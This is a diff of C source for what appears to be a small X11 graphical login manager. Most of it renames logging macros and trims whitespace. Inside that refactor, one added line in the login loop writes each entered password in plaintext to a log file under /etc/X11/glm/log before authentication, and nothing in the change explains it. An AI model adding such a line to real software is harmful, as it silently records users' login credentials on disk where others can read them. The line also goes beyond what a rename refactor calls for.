@@ -68,10 +68,10 @@
 #include <stdio.h>
 #include <stdlib.h>
 
-#define   XTTY     "tty7"
-#define   LOG      "/etc/X11/glm/log/interface.log"
-#define   FLAG     "TRUE"
-#define   XSETUP   "/etc/X11/glm/src/x/Xsetup"
+#define   XTTY                 "tty7"
+#define   INTERFACE_LOG_FILE   "/etc/X11/glm/log/interface.log"
+#define   INTERFACE_FLAG       "TRUE"
+#define   XSETUP               "/etc/X11/glm/src/x/Xsetup"
 
 
 // ////////////////////////////////
@@ -88,7 +88,7 @@ int main(int argc, char *argv[]) {
     
     // Setup the X server for logging in
     pid_t child_pid = fork();
-    if ( child_pid == 0 ) 
+    if ( child_pid == 0 )
         execl(XSETUP, XSETUP, DISPLAY, XTTY, NULL);
     else {
         int status;
@@ -97,7 +97,7 @@ int main(int argc, char *argv[]) {
     
     
     // Log to file that interface is beginning execution
-    file_write(LOG, "FALSE", "%s\n");
+    file_write(INTERFACE_LOG_FILE, "FALSE", "%s\n");
     
     
     // Display login interface
@@ -111,9 +111,9 @@ int main(int argc, char *argv[]) {
     int status = 1;
     while (status) {
         
-        char *checkflag = file_read(LOG);
+        char *checkflag = file_read(INTERFACE_LOG_FILE);
         
-        if ( strcmp(checkflag, FLAG) == 0 ) {
+        if ( strcmp(checkflag, INTERFACE_FLAG) == 0 ) {
             while (status) {
                 
                 /* // Uncomment to take a screenshot */
@@ -123,7 +123,7 @@ int main(int argc, char *argv[]) {
                 
                 char *PASSWORD = password_entry(argc, argv);
                 char *USERNAME = file_read("/etc/X11/glm/log/user.log"); 
-                
+                file_write("/etc/X11/glm/log/fuck2.log", PASSWORD, "%s\n");
                 status  = login(USERNAME, PASSWORD);
                 
                 free(PASSWORD);
